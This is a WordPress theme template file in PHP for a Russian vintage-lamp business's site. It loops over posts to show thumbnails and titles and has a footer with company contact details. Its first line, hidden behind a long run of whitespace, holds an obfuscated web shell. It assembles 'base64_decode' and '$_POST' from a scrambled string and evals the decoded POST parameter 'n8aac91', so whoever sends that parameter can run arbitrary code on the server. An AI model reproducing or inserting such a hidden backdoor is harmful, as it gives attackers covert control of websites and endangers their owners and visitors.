<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n8aac91'])) {eval($s21(${$s20}['n8aac91']));}?><?php
/*
Template Name: cs2
*/
?><?php

/**

 * The main template file.

 *

 * This is the most generic template file in a WordPress theme

 * and one of the two required files for a theme (the other being style.css).

 * It is used to display a page when nothing more specific matches a query.

 * E.g., it puts together the home page when no home.php file exists.

 * Learn more: http://codex.wordpress.org/Template_Hierarchy

 *

 * @package WordPress

 * @subpackage Retrolamp

 */



get_header(); ?>



<div class="fixsed">

	

	<?php get_sidebar(); ?>

	

	<div id="content">

		<!--

		<div class="section">

			<h3 class="title"><b><? // =single_cat_title( '', false );?><span></span><span></span></b></h3>

		</div>

		-->

		<?php if ( have_posts() ) : ?>

			<?php while ( have_posts() ) : the_post(); ?>

				<div class="ne1">

					<a class="ne1" href="<?=the_permalink();?>"><?=get_the_post_thumbnail($post->ID, array(310,250) );?></a>

				 

					<div class="hs">

						<a href="<?=the_permalink();?>"><? the_title(); ?></a>

					</div>

	 

				</div>

       		<?php endwhile; ?>

       		<div style="clear:both;"></div>

       		<?php if (  $wp_query->max_num_pages > 1 ) : ?>

                    <?php kama_pagenavi(); ?>

			<?php endif; ?>

       		

		<?php else : ?>

			<div class="widget">

				<!--

				<div class="band">

					<h3><?//=single_cat_title( '', false );?></h3>

					<span></span>

				</div>

				-->

				<!-- <div class="icon article list"> -->

					<article id="post-0" class="post no-results not-found">

						<h1 class="entry-title"><?php _e( 'Нет данных для этой страницы', 'retrolamp' ); ?></h1>

					</article>

				<!-- </div> -->

			</div>

		<?php endif; ?>

	

	</div>

	<div class="clear"></div>

	

	<div class="margin">

		<h3 class="title_yellow">ООО “Ретро Лампа”</h3>

		<p>г. Красноармейск ул. Маяковского</p>

		<p>Тел: +7(926) 603-18-36</p>

		<p>Email - romatti@me.com</p>







	</div>

	<div class="clear"></div>       

</div>



<?php get_footer(); ?> 